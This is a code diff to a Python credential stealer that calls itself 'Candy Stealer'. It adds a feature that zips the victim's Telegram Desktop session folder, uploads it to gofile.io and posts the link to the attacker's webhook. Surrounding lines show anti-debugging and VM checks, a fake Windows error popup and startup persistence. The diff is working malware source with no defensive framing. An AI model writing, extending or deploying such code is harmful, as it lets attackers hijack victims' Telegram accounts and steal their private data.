@@ -33,7 +33,8 @@ __CONFIG__ = {
     "Steam": False,
     "Anti_Debugs_VM": True,
     "backupcode": False,
-    "ERROR": False
+    "ERROR": False,
+    "Telegram": False,
 }
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -673,18 +674,45 @@ def startup():
 def fakeerror():
     ctypes.windll.user32.MessageBoxW(0, "A critical error has occurred.", "Windows Unexpected error", 0x10)
 
-#def startup():
-#   startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-#
-#   current_file = sys.argv[0]
-#    filename = os.path.basename(current_file)
-#
-#   target_path = os.path.join(startup_path, filename)
-#
-#    if not os.path.exists(target_path):
-#        shutil.copy(current_file, target_path)
-#    else:
-#        return
+def telegram():
+    ROAMING = os.getenv('APPDATA')
+    telegram_tdata = os.path.join(ROAMING, "Telegram Desktop", "tdata")
+
+    if not os.path.exists(telegram_tdata):
+        print(f"Telegram tdata folder does not exist: {telegram_tdata}")
+        return
+
+    temp_dir = tempfile.gettempdir()
+    zip_filename = "telegram.zip"
+    zip_path = os.path.join(temp_dir, zip_filename)
+
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, dirs, files in os.walk(telegram_tdata):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, start=telegram_tdata)
+                zipf.write(file_path, arcname)
+
+    try:
+        with open(zip_path, 'rb') as f:
+            files = {'file': (zip_filename, f)}
+            response = requests.post("https://upload.gofile.io/uploadfile", files=files)
+            result = response.json()
+
+        if result["status"] != "ok":
+            return
+
+        gofile = result["data"]["downloadPage"]
+
+        data = {
+            "username": "Candy Stealer",
+            "avatar_url": __CONFIG__["avatar_link"],
+            "content": f"Telegram\n{gofile}"
+        }
+        res = requests.post(__CONFIG__["webhook"], json=data)
+
+    except Exception as e:
+        print(f"{e}")
 
 def run_config():
     if __CONFIG__.get("Anti_Debugs_VM"):
@@ -710,5 +738,9 @@ def run_config():
     # =========================== #
     if __CONFIG__.get("ERROR"):
         fakeerror()
-
+    # =========================== #
+    if __CONFIG__.get("Telegram"):
+        telegram()
+    # =========================== #
+    
 run_config()
